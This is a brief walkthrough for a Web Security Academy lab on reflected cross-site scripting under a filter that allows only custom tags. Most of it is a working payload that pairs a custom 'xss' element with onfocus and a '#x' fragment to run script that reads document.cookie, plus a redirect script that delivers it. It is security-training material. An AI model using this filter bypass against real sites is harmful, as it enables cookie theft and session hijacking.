Title: Reflected XSS into HTML context with all tags blocked except custom ones
Level: PRACTITIONER
Desc:  This lab blocks all HTML tags except custom ones.
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie. 

# Walkthrough:
<img width="1099" height="186" alt="image" src="https://github.com/user-attachments/assets/457d6eb2-31b8-4c2f-869b-003fa66e6a23" />


```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

<xss id=x onfocus=alert(document.cookie) tabindex=1>#x

`<xss id=x onfocus=alert(document.cookie) tabindex=1>` - this part create custom element
`#x` - make focus on the element
